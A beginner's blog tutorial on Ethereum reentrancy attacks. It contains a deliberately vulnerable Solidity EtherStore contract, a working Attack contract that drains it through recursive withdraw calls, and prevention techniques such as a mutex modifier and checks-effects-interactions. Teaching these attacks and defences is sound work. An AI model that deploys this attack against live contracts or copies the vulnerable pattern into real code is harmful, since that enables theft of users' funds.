---
title: "Understanding Reentrancy Attacks"
datePublished: Fri Sep 01 2023 12:57:44 GMT+0000 (Coordinated Universal Time)
cuid: clm0loc8q000b09mld49188zn
slug: understanding-reentrancy-attacks
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1692609684469/cf8f8ffc-90fd-4625-a328-c7c2822da195.png
tags: blockchain, solidity, web3, smart-contracts, reentrancy

---

Reentrancy is one of the most common vulnerabilities in Ethereum smart contract programming. It allows attackers to repeatedly call functions in a contract before the first invocation finishes execution. This can lead to unintended draining of funds from the contract.

In this beginner's guide, we will understand what a reentrancy attack is, see an example attack contract exploiting this vulnerability, learn how to prevent reentrancy in Solidity, and best practices to write secure Ethereum dApps.

## Real World Example - The DAO Hack

The most famous reentrancy attack is The DAO hack in 2016, where 3.6 million Ether worth $70 million at that time was stolen.

The DAO contract had a vulnerable `withdraw()` function that allowed attackers to recursively call the function and drain Ether stored in the contract.

## Sample Vulnerable Contract

Here is a simple Solidity contract vulnerable to reentrancy:

```solidity
// Vulnerable Contract
contract EtherStore {

  mapping(address => uint) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);

    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

}

contract Attack {

  EtherStore public etherStore;

  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  fallback() external payable {
    if(address(etherStore).balance >= 1 ether) {
      etherStore.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw();
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

}
```

This EtherStore contract keeps a record of balances in a mapping. The `withdraw()` function first checks the balance, then sends Ether and finally sets the balance to 0.

The Attack contract calls `etherStore.withdraw()` in the fallback function, allowing it to call withdraw again before the first call completes.

## **How a Reentrancy Attack Works**

A reentrancy attack works as follows:

1. The attacker contract calls `EtherStore.withdraw()`
    
2. `EtherStore` checks balances and then sends Ether to attacker
    
3. Before `withdraw()` finishes, the attacker contract calls `withdraw()` again via the fallback function
    
4. `EtherStore` still has the same balances, so sends Ether again
    
5. This repeats until the contract's Ether balance becomes 0
    

## Preventing Reentrancy in Smart Contracts

Here are some best practices to prevent reentrancy in Solidity smart contracts:

### Use Locking

Use a `reentrancyLock` boolean and check it before state changes:

```solidity
contract EtherStore {

  bool internal lock; 

  modifier noReentrant() {
    require(!lock, "No reentrancy");
    lock = true;
    _;
    lock = false;
  }

  function withdraw() public noReentrant {
    // ...
  }

}
```

The `noReentrant` modifier prevents reentrancy by using a mutex.

### **Other Ways to Prevent Reentrancy**

Other ways to prevent reentrancy include:

* Use the Checks-Effects-Interactions pattern - check conditions first, change state next, then make external calls
    
* Use pull over push payments - let users withdraw to their account rather than pushing funds to them
    
* Limit the amount withdrawn per transaction
    
* Use reentrancy guard libraries like OpenZeppelin's ReentrancyGuard
    

## Conclusion

Reentrancy is a major security vulnerability in Ethereum smart contract programming. By learning secure coding practices like proper state management and reentrancy locks, these attacks can be prevented. Thoroughly reviewing and auditing smart contract code before deploying to mainnet is essential.

# GITHUB LINK

[Smart Contracts Security Github Repo](https://github.com/moayaan1911/smartContracts-Security)